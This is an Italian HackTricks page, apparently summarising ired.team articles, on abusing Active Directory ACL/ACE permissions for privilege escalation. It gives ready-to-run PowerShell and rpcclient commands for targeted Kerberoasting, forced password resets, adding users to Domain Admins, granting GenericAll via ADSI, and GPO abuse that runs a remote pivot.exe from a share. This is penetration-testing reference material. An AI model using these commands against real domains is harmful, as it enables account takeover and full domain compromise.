# Abuso di ACL/ACE di Active Directory

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità più importanti in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Questa pagina è principalmente un riassunto delle tecniche da [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) e [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges). Per ulteriori dettagli, consulta gli articoli originali.**


## **Diritti GenericAll sull'utente**
Questo privilegio concede all'attaccante il pieno controllo su un account utente di destinazione. Una volta confermati i diritti `GenericAll` utilizzando il comando `Get-ObjectAcl`, un attaccante può:

- **Cambiare la password del bersaglio**: Utilizzando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
- **Kerberoasting mirato**: Assegnare un SPN all'account dell'utente per renderlo kerberoastable, quindi utilizzare Rubeus e targetedKerberoast.py per estrarre e tentare di craccare gli hash del ticket-granting ticket (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **ASREPRoasting mirato**: Disabilita la pre-autenticazione per l'utente, rendendo il loro account vulnerabile all'ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Diritti GenericAll sul Gruppo**
Questo privilegio consente a un attaccante di manipolare l'appartenenza ai gruppi se ha i diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distintivo del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al Gruppo Domain Admins**: Questo può essere fatto tramite comandi diretti o utilizzando moduli come Active Directory o PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write su Computer/Utente**
Possedere questi privilegi su un oggetto computer o su un account utente consente di:

- **Delega vincolata basata su risorse Kerberos**: Consente di prendere il controllo di un oggetto computer.
- **Credenziali ombra**: Utilizzare questa tecnica per impersonare un account computer o utente sfruttando i privilegi per creare credenziali ombra.

## **WriteProperty su Gruppo**
Se un utente ha i diritti di `WriteProperty` su tutti gli oggetti di un gruppo specifico (ad esempio, `Domain Admins`), può:

- **Aggiungersi al gruppo Domain Admins**: Ottenibile tramite la combinazione dei comandi `net user` e `Add-NetGroupUser`, questo metodo consente l'elevazione dei privilegi all'interno del dominio.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Appartenenza a se stessi) al Gruppo**
Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, attraverso comandi che manipolano direttamente l'appartenenza al gruppo. Utilizzando la seguente sequenza di comandi è possibile aggiungersi autonomamente:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Appartenenza a se stessi)**
Un privilegio simile, questo consente agli attaccanti di aggiungersi direttamente ai gruppi modificando le proprietà dei gruppi se hanno il diritto di `WriteProperty` su quei gruppi. La conferma e l'esecuzione di questo privilegio vengono eseguite con:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Detenere l'`ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare le password senza conoscere quella attuale. La verifica di questo diritto e la sua sfruttamento possono essere effettuate tramite PowerShell o strumenti da riga di comando alternativi, offrendo diversi metodi per reimpostare la password di un utente, inclusi sessioni interattive e comandi in una sola riga per ambienti non interattivi. I comandi vanno dall'invocazione semplice di PowerShell all'utilizzo di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner sul Gruppo**
Se un attaccante scopre di avere i diritti di `WriteOwner` su un gruppo, può cambiare la proprietà del gruppo a se stesso. Questo è particolarmente significativo quando il gruppo in questione è `Domain Admins`, poiché il cambio di proprietà consente un controllo più ampio sulle attributi del gruppo e sulla sua appartenenza. Il processo prevede l'individuazione dell'oggetto corretto tramite `Get-ObjectAcl` e l'utilizzo di `Set-DomainObjectOwner` per modificare il proprietario, sia tramite SID che tramite nome.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite su Utente**
Questa autorizzazione consente a un attaccante di modificare le proprietà dell'utente. In particolare, con l'accesso `GenericWrite`, l'attaccante può modificare il percorso dello script di accesso di un utente per eseguire uno script dannoso durante l'accesso dell'utente. Ciò viene realizzato utilizzando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente di destinazione in modo che punti allo script dell'attaccante.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite su Gruppo**
Con questo privilegio, gli attaccanti possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo se stessi o altri utenti a gruppi specifici. Questo processo prevede la creazione di un oggetto di credenziali, utilizzandolo per aggiungere o rimuovere utenti da un gruppo e verificare le modifiche di appartenenza tramite comandi PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Possedere un oggetto AD e avere i privilegi `WriteDACL` su di esso consente a un attaccante di concedersi i privilegi `GenericAll` sull'oggetto. Ciò viene realizzato attraverso la manipolazione di ADSI, consentendo il pieno controllo sull'oggetto e la possibilità di modificare le sue appartenenze ai gruppi. Nonostante ciò, esistono limitazioni quando si cerca di sfruttare questi privilegi utilizzando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replicazione nel dominio (DCSync)**
L'attacco DCSync sfrutta le specifiche autorizzazioni di replica nel dominio per simulare un Domain Controller e sincronizzare i dati, inclusi le credenziali degli utenti. Questa potente tecnica richiede autorizzazioni come `DS-Replication-Get-Changes`, consentendo agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accesso diretto a un Domain Controller.
[**Per saperne di più sull'attacco DCSync, clicca qui.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato per gestire gli oggetti Group Policy (GPO) può presentare significativi rischi per la sicurezza. Ad esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione dei GPO, potrebbe avere privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Queste autorizzazioni possono essere sfruttate per scopi malevoli, come identificato utilizzando PowerView:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### Enumerazione delle autorizzazioni GPO

Per identificare i GPO configurati in modo errato, è possibile concatenare i cmdlet di PowerSploit. Ciò consente di scoprire i GPO che un utente specifico ha autorizzazioni per gestire:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Computer con una determinata policy applicata**: È possibile determinare a quali computer viene applicato un GPO specifico, aiutando a comprendere l'ambito dell'impatto potenziale.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Policy applicate a un determinato computer**: Per vedere quali policy vengono applicate a un computer specifico, è possibile utilizzare comandi come `Get-DomainGPO`.

**OU con una determinata policy applicata**: L'identificazione delle unità organizzative (OU) interessate da una determinata policy può essere fatta utilizzando `Get-DomainOU`.

### Abuso di GPO - New-GPOImmediateTask

I GPO configurati in modo errato possono essere sfruttati per eseguire codice, ad esempio, creando un'attività pianificata immediata. Ciò può essere fatto per aggiungere un utente al gruppo degli amministratori locali sulle macchine interessate, elevando significativamente i privilegi.
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### Modulo GroupPolicy - Abuso di GPO

Il modulo GroupPolicy, se installato, consente la creazione e il collegamento di nuove GPO e l'impostazione di preferenze come i valori del registro per eseguire backdoor sui computer interessati. Questo metodo richiede l'aggiornamento della GPO e l'accesso di un utente al computer per l'esecuzione:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuso di GPO

SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza la necessità di creare nuove GPO. Questo strumento richiede la modifica delle GPO esistenti o l'utilizzo degli strumenti RSAT per crearne di nuove prima di applicare le modifiche:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forzare l'Aggiornamento delle Policy

Di solito, gli aggiornamenti delle GPO avvengono ogni 90 minuti. Per accelerare questo processo, specialmente dopo aver apportato una modifica, è possibile utilizzare il comando `gpupdate /force` sul computer di destinazione per forzare un immediato aggiornamento delle policy. Questo comando assicura che le modifiche alle GPO vengano applicate senza dover attendere il ciclo di aggiornamento automatico successivo.

### Sotto il Cofano

Ispezionando i Task Pianificati per una determinata GPO, come ad esempio la `Misconfigured Policy`, è possibile confermare l'aggiunta di task come `evilTask`. Questi task vengono creati tramite script o strumenti da riga di comando con lo scopo di modificare il comportamento del sistema o ottenere privilegi elevati.

La struttura del task, come mostrato nel file di configurazione XML generato da `New-GPOImmediateTask`, descrive i dettagli del task pianificato, inclusi il comando da eseguire e i suoi trigger. Questo file rappresenta come i task pianificati vengono definiti e gestiti all'interno delle GPO, fornendo un metodo per eseguire comandi o script arbitrari come parte dell'applicazione delle policy.

### Utenti e Gruppi

Le GPO consentono anche la manipolazione delle appartenenze degli utenti e dei gruppi nei sistemi di destinazione. Modificando direttamente i file di policy degli Utenti e dei Gruppi, gli attaccanti possono aggiungere utenti a gruppi privilegiati, come il gruppo locale degli `amministratori`. Ciò è possibile attraverso la delega dei permessi di gestione delle GPO, che consente la modifica dei file di policy per includere nuovi utenti o modificare le appartenenze ai gruppi.

Il file di configurazione XML per Utenti e Gruppi descrive come vengono implementate queste modifiche. Aggiungendo voci a questo file, è possibile concedere privilegi elevati a utenti specifici su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi attraverso la manipolazione delle GPO.

Inoltre, possono essere considerati anche metodi aggiuntivi per eseguire codice o mantenere la persistenza, come sfruttare script di accesso/uscita, modificare chiavi di registro per gli autorun, installare software tramite file .msi o modificare configurazioni dei servizi. Queste tecniche offrono varie possibilità per mantenere l'accesso e controllare i sistemi di destinazione attraverso l'abuso delle GPO.

## Riferimenti

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder monitora la tua superficie di attacco, esegue scansioni proattive delle minacce, individua problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in formato PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
